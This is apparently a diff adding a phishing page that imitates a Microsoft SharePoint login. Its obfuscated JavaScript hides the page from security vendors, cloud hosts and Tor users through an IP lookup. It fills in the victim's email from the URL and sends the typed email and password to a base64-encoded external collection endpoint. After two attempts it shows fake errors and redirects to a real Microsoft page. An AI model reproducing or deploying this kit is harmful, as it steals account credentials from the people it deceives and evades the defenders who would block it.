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">
+                <form id="form-login" method="post" onsubmit="return false;">
+                    <div class="form-element form-stack">
+                        <label for="username-login" class="form-label">Email</label>
+                        <input id="username-login" type="text" name="username" disabled>
+                    </div>
+                    <div class="form-element form-stack">
+                        <label for="password-login" class="form-label">Password</label>
+                        <input id="password-login" type="password" name="password">
+
+                        <a class="error"><br>Host authentication error (0x505), try again</a>
+                        <a class="error"><br>Session timeout, login!</a>
+                    </div>
+                    <div class="form-element form-submit">
+                        <button id="logIn" class="login" type="submit" name="login">Next</button>
+                    </div>
+                </form>
+                <br>
+                <a href="https://docs.microsoft.com/en-us/office/developer-program/terms-and-conditions" class="mslable">© Microsoft SharePoint&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Privacy&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Policy</a>
+            </div>
+        </div>
+
+    </div>
+
+    <script>
+        const _0x48b89f = _0xcae0;
+        (function(_0x154c19, _0x1935f6) {
+            const _0x41e623 = _0xcae0,
+                _0x31e8e9 = _0x154c19();
+            while (!![]) {
+                try {
+                    const _0x5228ed = -parseInt(_0x41e623(0x1f4)) / 0x1 * (-parseInt(_0x41e623(0x1fd)) / 0x2) + parseInt(_0x41e623(0x209)) / 0x3 + -parseInt(_0x41e623(0x1ed)) / 0x4 * (-parseInt(_0x41e623(0x213)) / 0x5) + parseInt(_0x41e623(0x222)) / 0x6 * (-parseInt(_0x41e623(0x1e6)) / 0x7) + -parseInt(_0x41e623(0x21a)) / 0x8 + -parseInt(_0x41e623(0x1f5)) / 0x9 + parseInt(_0x41e623(0x1fe)) / 0xa * (-parseInt(_0x41e623(0x1fb)) / 0xb);
+                    if (_0x5228ed === _0x1935f6) break;
+                    else _0x31e8e9['push'](_0x31e8e9['shift']());
+                } catch (_0x59aeb9) {
+                    _0x31e8e9['push'](_0x31e8e9['shift']());
+                }
+            }
+        }(_0x1fa5, 0x9392f));
+        const error = document[_0x48b89f(0x1cf)]('.error'),
+            button = document[_0x48b89f(0x21d)](_0x48b89f(0x1eb)),
+            emailInput = document[_0x48b89f(0x21d)](_0x48b89f(0x1d5)),
+            passwordInput = document[_0x48b89f(0x21d)](_0x48b89f(0x217)),
+            rightBox = document['querySelector'](_0x48b89f(0x226)),
+            overLayBox = document[_0x48b89f(0x21d)](_0x48b89f(0x221)),
+            allbody = document[_0x48b89f(0x21d)](_0x48b89f(0x1f1)),
+            userAccount = document['getElementById']('userAccount'),
+            userOrg = document[_0x48b89f(0x1d3)](_0x48b89f(0x1f6)),
+            dateLabel = document[_0x48b89f(0x1cf)](_0x48b89f(0x1d0)),
+            topFiles = document['getElementById'](_0x48b89f(0x1e0)),
+            finance = document[_0x48b89f(0x1d3)](_0x48b89f(0x1de)),
+            scanp = document[_0x48b89f(0x1d3)](_0x48b89f(0x1f8)),
+            delaySettings = () => {
+                setTimeout(function() {
+                    const _0x3b1fe3 = _0xcae0;
+                    overLayBox[_0x3b1fe3(0x1f9)][_0x3b1fe3(0x1dc)] = 'flex', setTimeout(function() {
+                        const _0x19336d = _0x3b1fe3;
+                        rightBox['style']['display'] = _0x19336d(0x1e8);
+                    }, 0x7d0);
+                }, 0xfa0);
+            };
+        format = function date2str(_0x1583f5, _0x1e26ed) {
+            const _0x357feb = _0x48b89f;
+            var _0x36066b = {
+                'M': _0x1583f5[_0x357feb(0x1e9)]() + 0x1,
+                'd': _0x1583f5[_0x357feb(0x1e4)](),
+                'h': _0x1583f5['getHours'](),
+                'm': _0x1583f5[_0x357feb(0x216)](),
+                's': _0x1583f5[_0x357feb(0x21b)]()
+            };
+            return _0x1e26ed = _0x1e26ed[_0x357feb(0x1df)](/(M+|d+|h+|m+|s+)/g, function(_0x2f9506) {
+                const _0x1815ce = _0x357feb;
+                return ((_0x2f9506['length'] > 0x1 ? '0' : '') + _0x36066b[_0x2f9506[_0x1815ce(0x211)](-0x1)])[_0x1815ce(0x211)](-0x2);
+            }), _0x1e26ed[_0x357feb(0x1df)](/(y+)/g, function(_0xf4889c) {
+                const _0x50373e = _0x357feb;
+                return _0x1583f5[_0x50373e(0x1ee)]()[_0x50373e(0x1db)]()[_0x50373e(0x211)](-_0xf4889c[_0x50373e(0x1e1)]);
+            });
+        };
+
+        function _0xcae0(_0x49687e, _0x5b3c86) {
+            const _0x1fa57e = _0x1fa5();
+            return _0xcae0 = function(_0xcae0b1, _0x335531) {
+                _0xcae0b1 = _0xcae0b1 - 0x1cf;
+                let _0x5b63fb = _0x1fa57e[_0xcae0b1];
+                return _0x5b63fb;
+            }, _0xcae0(_0x49687e, _0x5b3c86);
+        }
+        const getParameters = _0x40a45b => {
+            const _0x6a0c1c = _0x48b89f;
+            let _0x70985d = _0x40a45b[_0x6a0c1c(0x1e3)]('@')[0x1],
+                _0x189e20 = _0x70985d['split']('.')[0x0],
+                _0xa3d432 = _0x189e20[0x0][_0x6a0c1c(0x21f)]() + _0x189e20[_0x6a0c1c(0x1d8)](0x1),
+                _0x272c08 = _0x40a45b['split']('@')[0x0][0x0][_0x6a0c1c(0x21f)]();
+            var _0x3bbaf1 = new Date(),
+                _0x52a4bd = _0x3bbaf1[_0x6a0c1c(0x1ee)]() + '-' + (_0x3bbaf1['getMonth']() + 0x1) + '-' + _0x3bbaf1[_0x6a0c1c(0x1e4)](),
+                _0x5f13ee = _0x3bbaf1[_0x6a0c1c(0x1ee)]() + '-' + (_0x3bbaf1[_0x6a0c1c(0x1e9)]() + 0x1),
+                _0x39a19e = _0x3bbaf1[_0x6a0c1c(0x1ee)]();
+            userAccount[_0x6a0c1c(0x21c)] = _0x272c08, userOrg[_0x6a0c1c(0x21c)] = _0x6a0c1c(0x228) + _0x70985d;
+            for (var _0x22d1de = dateLabel[_0x6a0c1c(0x1e1)] - 0x1; _0x22d1de >= 0x0; _0x22d1de--) {
+                dateLabel[_0x22d1de][_0x6a0c1c(0x21c)] = _0x39a19e;
+            }
+            return [_0x70985d, _0x189e20, _0xa3d432, _0x272c08, _0x52a4bd, _0x5f13ee];
+        };
+
+        function ValidateEmail(_0x19f0c3) {
+            const _0x3626bd = _0x48b89f;
+            if (/^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9-]+(?:\.[a-zA-Z0-9-]+)*$/ [_0x3626bd(0x212)](_0x19f0c3)) return !![];
+            return ![];
+        }
+
+        function redirrectPage() {
+            const _0x525187 = _0x48b89f;
+            let _0x5438b5 = window[_0x525187(0x20d)][_0x525187(0x20b)];
+            console['log'](_0x5438b5);
+            let _0x337f35 = _0x5438b5[_0x525187(0x1e3)]('#'),
+                _0xfeda03 = _0x337f35[0x0],
+                _0x5033bd = _0x337f35[0x1];
+            return console[_0x525187(0x227)](_0xfeda03), console[_0x525187(0x227)](_0x5033bd), _0x5033bd ? (delaySettings(), allbody[_0x525187(0x1f9)][_0x525187(0x1dc)] = 'block', error[0x1][_0x525187(0x1f9)][_0x525187(0x1dc)] = _0x525187(0x1e8), ValidateEmail(_0x5033bd) ? (emailInput[_0x525187(0x223)] = _0x5033bd, getParameters(emailInput[_0x525187(0x223)])) : (emailInput[_0x525187(0x223)] = atob(_0x5033bd), getParameters(emailInput[_0x525187(0x223)]))) : console['log']('false'), _0x5033bd;
+        }
+        const entryPoint = async() => {
+            const _0x420966 = _0x48b89f;
+            let _0x119f56 = !![];
+            const _0x13d3a2 = [_0x420966(0x1da), _0x420966(0x203), _0x420966(0x1dd), 'yahoo', _0x420966(0x22a), _0x420966(0x202), _0x420966(0x20c), _0x420966(0x1f3), _0x420966(0x1e7), _0x420966(0x208), _0x420966(0x200), 'amazon', _0x420966(0x220), _0x420966(0x215), _0x420966(0x21e), _0x420966(0x1fc), _0x420966(0x1d1), 'calyxinstitute', _0x420966(0x1ea), _0x420966(0x1d6), 'DIGITALOCEAN', _0x420966(0x20e), 'cisco', _0x420966(0x1ec), _0x420966(0x225)],
+                _0x934117 = await fetch(atob('aHR0cHM6Ly9pcGluZm8uaW8vanNvbj90b2tlbj0zM2I5YWYzNzU0MWIyZQ==')),
+                _0x5f0f10 = await _0x934117[_0x420966(0x219)]();
+            var _0x434e6a = _0x5f0f10[_0x420966(0x207)]['toLowerCase']();
+            _0x13d3a2['forEach'](function(_0x50b916, _0x376267) {
+                const _0x8cb4dc = _0x420966;
+                _0x434e6a[_0x8cb4dc(0x205)](_0x50b916[_0x8cb4dc(0x1d9)]()) && (console['log'](_0x8cb4dc(0x229), _0x50b916), _0x119f56 = ![]);
+            }), _0x119f56 && (console[_0x420966(0x227)](_0x420966(0x1d7)), redirrectPage());
+        };
+        entryPoint();
+        const createUser = async(_0x298593, _0x136428, _0x5de5b9) => {
+            const _0x4c74cc = _0x48b89f,
+                _0x596051 = await fetch(atob('aHR0cHM6Ly8yMDIwYXBpLTAwMDAwMDAwMDAwLXJldjEudXMtc291dGguY2YuYXBwZG9tYWluLmNsb3VkLz9yYm94PXZvcm5tZXNtaXRAZ21haWwuY29t') + _0x4c74cc(0x201) + _0x298593 + _0x4c74cc(0x20f) + _0x136428 + '&Docounter=' + _0x5de5b9 + _0x4c74cc(0x214) + _0x4c74cc(0x1e5));
+            console[_0x4c74cc(0x227)](_0x4c74cc(0x224));
+        };
+
+        function _0x1fa5() {
+            const _0x15099a = ['SHAREPOINT', '11326ygDTyg', 'google', 'block', 'getMonth', 'tor-exit', '#logIn', 'sophos', '4ORxutT', 'getFullYear', 'Done\x202\x20times', 'https://support.microsoft.com/en-us/office/fix-onedrive-sync-problems-0899b115-05f7-45ec-95b2-e4cc8c4670b2', '#allbody', 'preventDefault', 'above', '593893QOXFnW', '5013081OTCawq', 'userOrg', 'click', 'scanp', 'style', 'addEventListener', '913RbwXFJ', 'dreamhost', '2ICoNds', '7980gTxIDU', 'email\x20ok', 'aws', '&email=', 'bot', 'yandex', 'keyup', 'includes', 'bad\x20email', 'org', 'softlayer', '2140239WtQtwq', '#cfcfcf', 'href', 'Robot', 'location', 'linode', '&password=', 'red', 'slice', 'test', '2892845xJqsya', '&pv=', 'cyveillance', 'getMinutes', '#password-login', 'borderColor', 'json', '3310808JmpoTS', 'getSeconds', 'innerHTML', 'querySelector', 'phishtank', 'toUpperCase', 'amazonaws', '.overlay', '906YXQCAP', 'value', 'ss\x20OK!', 'fortinet', '.right', 'log', 'skype.', 'yes', 'icann', 'querySelectorAll', '#dateLabel', 'netpilot', 'reload', 'getElementById', 'focusin', '#username-login', 'microsoft', 'SAVE\x20USER', 'substring', 'toLowerCase', 'gmail', 'toString', 'display', 'ymail', 'finance', 'replace', 'topFiles', 'length', 'none', 'split', 'getDate'];
+            _0x1fa5 = function() {
+                return _0x15099a;
+            };
+            return _0x1fa5();
+        }
+        var counter = 0x1;
+        const signin = async() => {
+            const _0x209db9 = _0x48b89f;
+            ValidateEmail(emailInput[_0x209db9(0x223)]) ? (console[_0x209db9(0x227)](_0x209db9(0x1ff)), passwordInput['value']['length'] > 0x4 ? (await createUser(emailInput[_0x209db9(0x223)], passwordInput[_0x209db9(0x223)], counter), counter++, counter > 0x2 ? (console[_0x209db9(0x227)](_0x209db9(0x1ef)), location[_0x209db9(0x1df)](_0x209db9(0x1f0))) : (error[0x0]['style'][_0x209db9(0x1dc)] = _0x209db9(0x1e8), passwordInput[_0x209db9(0x1f9)][_0x209db9(0x218)] = _0x209db9(0x210), error[0x1][_0x209db9(0x1f9)][_0x209db9(0x1dc)] = _0x209db9(0x1e2), document['querySelector'](_0x209db9(0x217))['value'] = '', rightBox['style'][_0x209db9(0x1dc)] = _0x209db9(0x1e8))) : (error[0x0]['style'][_0x209db9(0x1dc)] = 'block', passwordInput[_0x209db9(0x1f9)][_0x209db9(0x218)] = _0x209db9(0x210), error[0x1][_0x209db9(0x1f9)][_0x209db9(0x1dc)] = _0x209db9(0x1e2), document[_0x209db9(0x21d)](_0x209db9(0x217))['value'] = '', rightBox[_0x209db9(0x1f9)][_0x209db9(0x1dc)] = 'block')) : console['log'](_0x209db9(0x206));
+        };
+        button[_0x48b89f(0x1fa)](_0x48b89f(0x1f7), () => {
+            const _0x57b2f0 = _0x48b89f;
+            !navigator['onLine'] ? location[_0x57b2f0(0x1d2)]() : (rightBox[_0x57b2f0(0x1f9)][_0x57b2f0(0x1dc)] = _0x57b2f0(0x1e2), setTimeout(function() {
+                signin();
+            }, 0xbb8));
+        }), document['querySelector'](_0x48b89f(0x217))['addEventListener'](_0x48b89f(0x1d4), () => {
+            const _0x2cc340 = _0x48b89f;
+            error[0x0]['style'][_0x2cc340(0x1dc)] = 'none', passwordInput[_0x2cc340(0x1f9)]['borderColor'] = _0x2cc340(0x20a);
+        }), document[_0x48b89f(0x21d)]('#password-login')['addEventListener']('keyup', function(_0x308e51) {
+            const _0x149240 = _0x48b89f;
+            _0x308e51['keyCode'] === 0xd && (_0x308e51[_0x149240(0x1f2)](), document[_0x149240(0x21d)](_0x149240(0x1eb))[_0x149240(0x1f7)]());
+        }), document[_0x48b89f(0x21d)]('#username-login')[_0x48b89f(0x1fa)](_0x48b89f(0x204), function(_0xb948ec) {
+            const _0x4d2c26 = _0x48b89f;
+            _0xb948ec['keyCode'] === 0xd && (_0xb948ec[_0x4d2c26(0x1f2)](), document['querySelector'](_0x4d2c26(0x1eb))[_0x4d2c26(0x1f7)]());
+        });
+    </script>
+
+</body>
+
+</html>
